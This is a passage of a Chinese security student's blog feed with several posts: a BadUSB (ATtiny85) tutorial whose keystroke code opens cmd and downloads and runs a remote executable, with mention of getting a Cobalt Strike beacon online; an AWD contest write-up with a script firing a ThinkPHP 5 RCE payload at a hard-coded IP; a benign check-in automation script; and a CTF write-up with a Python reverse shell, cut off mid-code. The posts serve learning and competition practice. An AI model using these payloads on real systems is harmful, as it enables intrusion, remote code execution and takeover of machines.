    <link href="https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/"/>
    <id>https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/</id>
    <published>2021-03-29T12:34:48.000Z</published>
    <updated>2021-04-20T19:41:48.607Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：</p><p>近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。</p></blockquote><h1 id="致谢-amp-参考"><a href="#致谢-amp-参考" class="headerlink" title="致谢&amp;参考"></a>致谢&amp;参考</h1><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><p><a href="https://blog.csdn.net/sxhexin/article/details/87914649">https://blog.csdn.net/sxhexin/article/details/87914649</a></p><p><a href="https://www.anquanke.com/post/id/227477">https://www.anquanke.com/post/id/227477</a></p><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><h1 id="Badusb-插入上线cobalt-strike"><a href="#Badusb-插入上线cobalt-strike" class="headerlink" title="Badusb 插入上线cobalt strike"></a>Badusb 插入上线cobalt strike</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>ATtiny85 开发板、arduino IDE下载<a href="https://www.arduino.cc/en/Main/Softwaredigispark%E3%80%82%E6%9A%82%E6%97%B6%E5%85%88%E4%B8%8D%E8%A6%81%E8%A3%85%E9%A9%B1%E5%8A%A8%EF%BC%81%EF%BC%81%E9%A9%B1%E5%8A%A8%E6%9C%89%E5%A4%A7%E5%9D%91%E3%80%82">https://www.arduino.cc/en/Main/Softwaredigispark。暂时先不要装驱动！！驱动有大坑。</a></p><p>看freeebuf里面的教程装完驱动，烧录完只能执行一次，需要更新下固件才可以重复使用，后面会提到。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>打开IDE,在文件-&gt;首选项中加入附加开发板管理，附加开发板管理网址处写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json</span><br></pre></td></tr></table></figure><p>注意，这里需要翻墙，后面添加开发板下载相关配置时也需要翻墙，现在就翻着 别断了。</p><h2 id="添加开发板"><a href="#添加开发板" class="headerlink" title="添加开发板"></a>添加开发板</h2><p>IDE中-工具-开发板管理，类型-contributed/贡献，选择</p><img src="http://cdn.polowong.top/static/images/boards.png"><p>然后选安装（翻墙）</p><p>安装好后，选择这个16.5mhz的开发板。</p><img src="http://cdn.polowong.top/static/images/1655.png"><h2 id="更新-boot-loader"><a href="#更新-boot-loader" class="headerlink" title="更新 boot loader"></a>更新 boot loader</h2><p>更新 BootLoader的教程看 <a href="https://blog.csdn.net/sxhexin/article/details/87914649%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%EF%BC%8C%E8%B7%9F%E7%9D%80%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E8%B5%B0%E6%B2%A1%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%B9%8B%E5%89%8D%E6%9C%89%E8%A3%85%E7%9B%B8%E5%85%B3%E9%A9%B1%E5%8A%A8%EF%BC%8C%E8%AF%B7%E6%8A%8A%E9%A9%B1%E5%8A%A8%E5%8D%B8%E8%BD%BD%E5%B9%B2%E5%87%80%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/sxhexin/article/details/87914649，这里不再赘述，跟着这个教程走没问题的，如果你之前有装相关驱动，请把驱动卸载干净！！！</a></p><p>更新BootLoader是因为避免踩烧录完只能运行一次的坑！！</p><p>BootLoader是大坑，一定要好好弄！</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>有兴趣一步步走的可以写个测试代码 cmd弹个窗什么的，我这里一步到位，直接远程加载exe。</p><p>对于cs 可以生成powershell，然后cmd里面powershell加载调用直接上线。</p><h2 id="使用CMD远程下载可执行文件"><a href="#使用CMD远程下载可执行文件" class="headerlink" title="使用CMD远程下载可执行文件"></a>使用CMD远程下载可执行文件</h2><p>我选择用cmd的原因是因为 我还不会powershell免杀（2333）</p><p>所以 探索了下 如何类似Linux执行多条命令，发现在Windows cmd下是and符号&amp;。</p><p>执行命令的代码框架如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span><span class="comment">//库文件</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// setup函数只运行一次</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);<span class="comment">//等待两秒，给电脑自动加载配置时间</span></span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//摁住WIN键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);<span class="comment">//等待300毫秒</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);<span class="comment">//输入CMD</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;curl http://12xxxx0/calc.exe &gt; E:\\calc.exe &amp; E:\\calc.exe&quot;</span>);<span class="comment">//执行PAYLOAD，双引号需要斜杠转义</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，在最后一个注释处，是在前面语句打开cmd黑框的情况下，在cmd中输入的语句。两个反斜杠是为了转义。</p><p>我的思路是，将可执行exe文件上传至服务器，通过curl的方式下载并重定向至某个驱动器并执行。</p><p>我本来想放到C盘，但是放到C盘，有可能存在权限问题（放在C:\Windows\Temp）目录下也有些问题，于是放到了D/E盘。</p><p>将上述代码在IDE中输入后ctrl+u上传，然后插入attiny85 </p><img src="http://cdn.polowong.top/static/images/in1.png"><p>一定是先拔出来，出现这个 60seconds的时候插进去，出现下面这一串代表写入成功 并且会自动执行一次。</p><p>然后拔出来 再插进去的时候 就有弹计算器的效果了。（小思考，如何在执行完exe后自动关闭cmd黑框？）</p><p>效果如下：</p><img src="http://cdn.polowong.top/static/images/反弹.gif"><h2 id="CMD上线CS"><a href="#CMD上线CS" class="headerlink" title="CMD上线CS"></a>CMD上线CS</h2><p>嫖来了大佬的免杀方法2333 试一下exe上线cs</p><img src="http://cdn.polowong.top/static/images/cs.gif"><p>小思考的答案是：命令后跟&amp; exit;</p><p>23333 </p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;近期在公司内部学了一点红队技能，虽然目前用不上，但是做个记录，顺便发牢骚。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;致谢-amp-参考&quot;&gt;&lt;a href=&quot;#致谢-amp-参考&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>近一年学习总结</title>
    <link href="https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-06T08:56:06.000Z</published>
    <updated>2021-03-06T09:10:50.739Z</updated>
    
    <content type="html"><![CDATA[<p>虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。</p><p>大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。</p><p>大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正经打的比赛是I春秋高校抗疫和BJDCTF。</p><p>这是一个纠结的过程，因为在那个阶段我还要准备保研，还在保研和考研两者之间摇摆。</p><p>最终下定决心冲一冲，那是三月底。某公众号预测我保研成功率在30%左右。</p><p>具体学什么知识在这里也不想说了，算是从最基础的开始学习吧，印象比较深的是LFI。现在我XSS和注入玩的也不好，算是只会用工具跑跑。</p><p>保完研之后有些许松懈，对安全知识的学习有些懈怠了，SRC还没开始搞，到现在上班时间也不太充裕。</p><p>现在正好是三月初，距离我开始正式接触安全也差不多一年的时间，在这一年里，我做到了：</p><p>1.两份渗透岗实习经历</p><p>2.两次通过护网面试，一次中级，一次初级。（蓝队</p><p>3.拿到五所985网络安全专业OFFER,其中四个学硕;</p><p>4.数次参加线上赛，虽然白给的较多</p><p>5.两次带队参加省赛</p><p>6.开始打AWD</p><p>7.独立发表一篇论文</p><p>8.独立完成两个小项目</p><p>9.美赛建模一等奖</p><p>10.自费MacBook Pro</p><p>11.经济独立</p><p>12.顺利保研</p><p>下一年渴望更健康的身体与相对坚强的意志，至少不能中午一觉睡三个小时。</p><p>仅此记录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然接触安全从初中就算开始了，但当时也仅仅是停留于混混娱乐圈，日一日别人的webshell。&lt;/p&gt;
&lt;p&gt;大一大二对安全知识的学习较少，大二外出打了两次比赛，成绩较差，直接白给。&lt;/p&gt;
&lt;p&gt;大三寒假疫情在家的时候算是正式开始学习安全知识，做最简单的靶场，刷题，前两次正</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次线上AWD</title>
    <link href="https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"/>
    <id>https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/</id>
    <published>2021-02-24T16:24:25.000Z</published>
    <updated>2021-02-24T16:52:22.848Z</updated>
    
    <content type="html"><![CDATA[<p>最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。</p><h1 id="开赛"><a href="#开赛" class="headerlink" title="开赛"></a>开赛</h1><p>开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart）</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。</p><p>在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。</p><p>在webshell查杀环节中应改进的地方是：</p><p>1.采用多种工具综合查杀webshell</p><p>2.对疑似后门文件手工查看，不能完全相信工具。</p><h3 id="弱点1"><a href="#弱点1" class="headerlink" title="弱点1"></a>弱点1</h3><p>流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。</p><h2 id="自检"><a href="#自检" class="headerlink" title="自检"></a>自检</h2><p>通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。</p><p>网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。</p><h3 id="弱点2"><a href="#弱点2" class="headerlink" title="弱点2"></a>弱点2</h3><p>在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。</p><h3 id="弱点3"><a href="#弱点3" class="headerlink" title="弱点3"></a>弱点3</h3><p>临场紧张+payload不熟悉</p><p>我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。</p><p>贴一下我当时写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。</p><h3 id="弱点4"><a href="#弱点4" class="headerlink" title="弱点4"></a>弱点4</h3><p>临场脚本编写能力欠缺</p><p>在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。</p><h3 id="弱点5"><a href="#弱点5" class="headerlink" title="弱点5"></a>弱点5</h3><p>对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。</p><h1 id="反思与改进"><a href="#反思与改进" class="headerlink" title="反思与改进"></a>反思与改进</h1><h2 id="提升脚本编写能力"><a href="#提升脚本编写能力" class="headerlink" title="提升脚本编写能力"></a>提升脚本编写能力</h2><p>不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。</p><p><strong>先把多线程和xpath解析学会了！！！</strong></p><h2 id="提升payload熟练度"><a href="#提升payload熟练度" class="headerlink" title="提升payload熟练度"></a>提升payload熟练度</h2><p>要求平时复现过程中不能拿到直接打，要分析原理与利用链。</p><h2 id="提升运维水平"><a href="#提升运维水平" class="headerlink" title="提升运维水平"></a>提升运维水平</h2><p>赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。</p><p>控制好相关文件的读写权限等。</p><h2 id="提升应急反应能力"><a href="#提升应急反应能力" class="headerlink" title="提升应急反应能力"></a>提升应急反应能力</h2><p>要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。</p><h2 id="提升反制能力"><a href="#提升反制能力" class="headerlink" title="提升反制能力"></a>提升反制能力</h2><p>要能通过别人打的payload反打别人</p><h2 id="完善武器库"><a href="#完善武器库" class="headerlink" title="完善武器库"></a>完善武器库</h2><p>多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。&lt;/p&gt;
&lt;h1 id=&quot;开赛&quot;&gt;&lt;a href=&quot;#开赛&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>智慧曲园自动签到+微信推送</title>
    <link href="https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"/>
    <id>https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/</id>
    <published>2021-01-19T14:11:27.000Z</published>
    <updated>2021-01-19T12:21:05.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="智慧曲园自动签到"><a href="#智慧曲园自动签到" class="headerlink" title="智慧曲园自动签到"></a>智慧曲园自动签到</h1><p><a href="https://github.com/polosec/qfnuAutoTemperatureSubmit">https://github.com/polosec/qfnuAutoTemperatureSubmit</a></p><p>使用方法：</p><p>首先安装环境依赖 pip3 install requests</p><p>将该脚本上传至服务器 （我的路径是/root）</p><p>新建脚本 auto.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/demo1.py xxxxx  xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py </span><br></pre></td></tr></table></figure><p>新建定时任务</p><p>crontab -e  1 0 * * * /root/auto.sh  </p><p>每天凌晨0点1分自动执行 /root/auto.sh 这条命令</p><h1 id="绑定server酱"><a href="#绑定server酱" class="headerlink" title="绑定server酱"></a>绑定server酱</h1><p>在server酱绑定微信后，拿到key，放到下面脚本 <strong>yourkey</strong> 这个地方。</p><p>serverjiang.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://sc.ftqq.com/yourkey.send?text=&quot;</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>).readline()</span><br><span class="line">data=json.loads(data)</span><br><span class="line">data=data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">text=<span class="built_in">str</span>(data)</span><br><span class="line">desp=<span class="string">&quot;success&quot;</span></span><br><span class="line">url=url+text+<span class="string">&quot;&amp;desp=&quot;</span>+desp</span><br><span class="line">r=requests.get(url=url).text</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>每天0点1分自动提交体温上报请求，并且将返回的信息（成功/错误）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;智慧曲园自动签到&quot;&gt;&lt;a href=&quot;#智慧曲园自动签到&quot; class=&quot;headerlink&quot; title=&quot;智慧曲园自动签到&quot;&gt;&lt;/a&gt;智慧曲园自动签到&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/polosec/qfnuAutoTe</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XCTF/*CTF web4</title>
    <link href="https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"/>
    <id>https://polosec.github.io/2021/01/18/XCTF-CTF-web4/</id>
    <published>2021-01-18T11:51:30.000Z</published>
    <updated>2021-01-18T12:26:01.085Z</updated>
    
    <content type="html"><![CDATA[<p>上周末刚结束了*ctf的比赛，又摸鱼了。。赛后看雪宝的wp复现出来的，发现是socket写的有点问题 搞到夜里三点也没搞出来 wtcl</p><h1 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh my socket"></a>oh my socket</h1><p>题目分析：</p><p>直接给了一堆docker 先跑起来看看是什么</p><p>docker-compose up -d</p><p>跑起来了三个容器 分别是 server client webserver</p><p>先整理下网络环境情况：</p><p>webserver 172.21.0.4</p><p>server 172.21.0.2</p><p>client 172.21.0.3</p><p>首先访问webserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> STDOUT, check_output</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        f.save(os.path.join(f.filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output = check_output([<span class="string">&#x27;python3&#x27;</span>, f.filename], stderr=STDOUT, timeout=<span class="number">80</span>)</span><br><span class="line">            content = output.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = e.__str__()</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;rm&#x27;</span>, f.filename]))</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>通过对源码进行审计 发现上传文件后会执行文件里面的内容，于是尝试反弹shell，上传如下脚本：</p><p>这里请注意理解该段代码的作用，和bash -i那个的原理相似，都是将std out std in std err重定向至socket。</p><p>详细的分析链接放在了最后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os </span><br><span class="line"> </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>本地监听搞起来，然后上传，得到反弹过来的shell</p><p>下面审计server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span 